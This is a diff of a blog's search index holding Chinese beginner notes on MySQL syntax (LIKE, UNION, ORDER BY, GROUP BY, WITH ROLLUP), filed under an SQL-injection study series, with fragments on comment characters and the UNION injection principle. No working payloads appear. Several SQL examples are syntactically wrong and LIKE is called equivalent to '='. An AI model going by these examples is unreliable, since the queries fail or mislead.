+<h2 id="like-子句"><a href="#like-子句" class="headerlink" title="like 子句"></a>like 子句</h2><pre><code>select 表中字段名 from where 表中字段名 like 数据；
+like 相当于 =
+可用and或者or指定一个或多个
+可在delete或update命令中使用where like 子句来指定条件 一定要和where连用eg`update from 表名 set 表中字段名=新数据 where 表中字段名 like 旧数据； `
+</code></pre>
+<h2 id="union操作符"><a href="#union操作符" class="headerlink" title="union操作符"></a>union操作符</h2><pre><code>用于连接两个以上的select语句的结果组合集合中。多个select语句会删除重复的数据。
+eg：`select 表中字段名1 from 表名1 union select 表中字段名2 from 表名2`
+可以用多个union连接
+</code></pre>
+<h2 id="MySQL排序"><a href="#MySQL排序" class="headerlink" title="MySQL排序"></a>MySQL排序</h2><pre><code>order by asc(升序) desc（降序）默认升序
+select * from 表名 order by 表中字段名 asc；
+</code></pre>
+<h2 id="MySQL分组"><a href="#MySQL分组" class="headerlink" title="MySQL分组"></a>MySQL分组</h2><pre><code>group by 语句    
+eg：select 表中字段名 ，count(*)from表名 group by 表中字段名
+***count(*)不能分开，逗号不能漏，count为函数，我们还可以使用sum，avg等函数。
+</code></pre>
+<h2 id="MySQL-使用with-rollup"><a href="#MySQL-使用with-rollup" class="headerlink" title="MySQL 使用with rollup"></a>MySQL 使用with rollup</h2><pre><code>实现分组求和
+`select 表中字段名，sum表中字段名as任意你想要的名称 from 表名 group by 表中字段名 with rollup；`
+null记录总数，可用`select coalesce (表中字段名，&#39;任意你想要的名称&#39;)，sum(表中字段名)as 任意你想要的名称 同上;`
+同样不要漏逗号了；
+</code></pre>
+]]></content>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqlmap</title>
     <url>/2020/11/24/sqli-labs/sqlmap/</url>
     <content><![CDATA[<p>   sqlmap的简单利用</p>
@@ -2594,41 +2629,6 @@ user():当前MySQL用户
 <h4 id="4、注释符"><a href="#4、注释符" class="headerlink" title="4、注释符"></a>4、注释符</h4><pre><code>#或--空格或/*/。
 </code></pre>
 <h4 id="5、-内联注释-代码-。"><a href="#5、-内联注释-代码-。" class="headerlink" title="5、 内联注释/!代码/。"></a>5、 内联注释/<em>!代码</em>/。</h4><h3 id="union-注入攻击"><a href="#union-注入攻击" class="headerlink" title="union 注入攻击"></a>union 注入攻击</h3><p>使用联合查询注入 sql1 union sql2 字段数要一致，不然会报错。</p>
-]]></content>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mysql3</title>
-    <url>/2020/11/11/sqli-labs/mysql3/</url>
-    <content><![CDATA[<h2 id="mysql插入数据"><a href="#mysql插入数据" class="headerlink" title="mysql插入数据"></a>mysql插入数据</h2><p><code>insert into 表名(名称1，-，-)</code><br><code>values</code><br><code>(插入的数据);</code></p>
-<span id="more"></span>
-
-<h2 id="mysql读取数据"><a href="#mysql读取数据" class="headerlink" title="mysql读取数据"></a>mysql读取数据</h2><p><code>select * from 数据表名</code><br>或<code>select 表中字段名 from 表名</code></p>
-<h2 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h2><p><code>update 表名 set 名称=新数据;</code></p>
-<h2 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h2><p><code>delete from 表名 where 名称=数据;</code></p>
-<h2 id="like-子句"><a href="#like-子句" class="headerlink" title="like 子句"></a>like 子句</h2><pre><code>select 表中字段名 from where 表中字段名 like 数据；
-like 相当于 =
-可用and或者or指定一个或多个
-可在delete或update命令中使用where like 子句来指定条件 一定要和where连用eg`update from 表名 set 表中字段名=新数据 where 表中字段名 like 旧数据； `
-</code></pre>
-<h2 id="union操作符"><a href="#union操作符" class="headerlink" title="union操作符"></a>union操作符</h2><pre><code>用于连接两个以上的select语句的结果组合集合中。多个select语句会删除重复的数据。
-eg：`select 表中字段名1 from 表名1 union select 表中字段名2 from 表名2`
-可以用多个union连接
-</code></pre>
-<h2 id="MySQL排序"><a href="#MySQL排序" class="headerlink" title="MySQL排序"></a>MySQL排序</h2><pre><code>order by asc(升序) desc（降序）默认升序
-select * from 表名 order by 表中字段名 asc；
-</code></pre>
-<h2 id="MySQL分组"><a href="#MySQL分组" class="headerlink" title="MySQL分组"></a>MySQL分组</h2><pre><code>group by 语句    
-eg：select 表中字段名 ，count(*)from表名 group by 表中字段名
-***count(*)不能分开，逗号不能漏，count为函数，我们还可以使用sum，avg等函数。
-</code></pre>
-<h2 id="MySQL-使用with-rollup"><a href="#MySQL-使用with-rollup" class="headerlink" title="MySQL 使用with rollup"></a>MySQL 使用with rollup</h2><pre><code>实现分组求和
-`select 表中字段名，sum表中字段名as任意你想要的名称 from 表名 group by 表中字段名 with rollup；`
-null记录总数，可用`select coalesce (表中字段名，&#39;任意你想要的名称&#39;)，sum(表中字段名)as 任意你想要的名称 同上;`
-同样不要漏逗号了；
-</code></pre>
 ]]></content>
       <tags>
         <tag>SQL注入</tag>
